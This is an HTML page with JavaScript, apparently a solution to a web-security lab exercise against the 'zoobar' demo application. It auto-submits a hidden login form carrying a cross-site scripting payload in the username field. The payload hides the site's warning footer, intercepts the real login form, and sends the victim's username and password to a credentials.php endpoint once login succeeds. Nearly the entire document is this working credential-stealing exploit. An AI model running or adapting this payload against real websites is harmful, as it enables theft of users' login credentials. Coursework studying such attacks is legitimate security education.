<!DOCTYPE html>
<html>

  <head>
    <title>&nbsp;</title>
    <meta charset="UTF-8"/>
    <style>
      #loginform{display: none;}
    </style>
  </head>

  <body>

    <form id="loginform" name="loginform" method="POST">
      <input type="text" id="username_field" name="login_username" value="">
      <input type="password" name="login_password" value="">
      <input type="submit" name="submit_login" value="Log in">
    </form>

    <script type="text/javascript">
    //<![CDATA[
      
      var hostname = "localhost"; 
      // var hostname = "zoobar.stanford.edu";

      var action = "http://" + hostname + "/index.php";

      var egg = "'' " +
         "onfocus='if ( typeof(onFocusEventProcessed)==\"undefined\" ) { onFocusEventProcessed = false; } " +
         
         "if (!onFocusEventProcessed){ " +
         "   var warning = document.getElementsByClassName(\"footer\")[0]; warning.style.display = \"none\"; " +

         "   var loginform = document.getElementsByName(\"loginform\")[0]; " +
         "   loginform.onsubmit = function() { " +
         "      var hostname = \"" + hostname + "\"; " +
         "      var username = document.getElementsByName(\"login_username\")[0].value; " +
         "      var password = document.getElementsByName(\"login_password\")[0].value; " +
         "      var login_query = \"login_username=\" + username + \"&\" + \"login_password=\" + password + \"&submit_login=Log%20in\"; " +
         "      var steal_query = \"username=\" + username + \"&\" + \"password=\" + password; " +
         "      var login_url = \"http://\" + hostname + \"/index.php\"; " +
         "      var steal_url = \"http://\" + hostname + \"/credentials.php\" + \"?\" + steal_query; " +
                  
         "      var login_handler = function () { " +
         "         if (this.readyState != 4) { return; } " +
         "         if (this.status != 200) { return; } " +
               
         "         var el = document.createElement(\"div\"); " +
         "         el.innerHTML = this.responseText; " +
               
         "         if (el.getElementsByClassName(\"footer\").length > 0) { " +
         "            login_successful = false; " +
         "            error_message = el.getElementsByClassName(\"footer\")[0].textContent; " +
         "            header_text = el.getElementsByTagName(\"h1\")[0].textContent; " +
         "            subheader_text = el.getElementsByTagName(\"h2\")[0].textContent; " +
         "         } " +
         "         else{ " +
         "            var steal_request = new XMLHttpRequest(); " +
         "            steal_request.open(\"GET\", steal_url, false); " +
         "            steal_request.send(); " +
         "            login_successful = true; " +
         "         } " +
         "      }; " +    
             
         "      var login_request = new XMLHttpRequest(); " +
         "      login_request.open(\"POST\", login_url, false); " +
         "      login_request.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\"); " +
         "      login_request.onreadystatechange = login_handler; " +
         "      login_request.send(login_query); " +
            
         "      if (!login_successful){ " +
         "         document.getElementsByTagName(\"h1\")[0].textContent = header_text; " +
         "         document.getElementsByTagName(\"h2\")[0].textContent = subheader_text; " +
         "         document.getElementsByName(\"login_password\")[0].value = \"\";" +
         "         document.getElementsByClassName(\"footer\")[0].textContent = error_message; " +
         "         document.getElementsByClassName(\"footer\")[0]; warning.style.display = \"block\"; " +
         "         return false; " +
         "      } " +
         "   }; " +
         "} " + 

         "onFocusEventProcessed = true;' ";


      var username_field = document.getElementById('username_field');
      var form = document.getElementById('loginform');

      username_field.value = egg;

      form.action = action;
      form.submit();

    //]]>
    </script>
    
  </body>

</html>
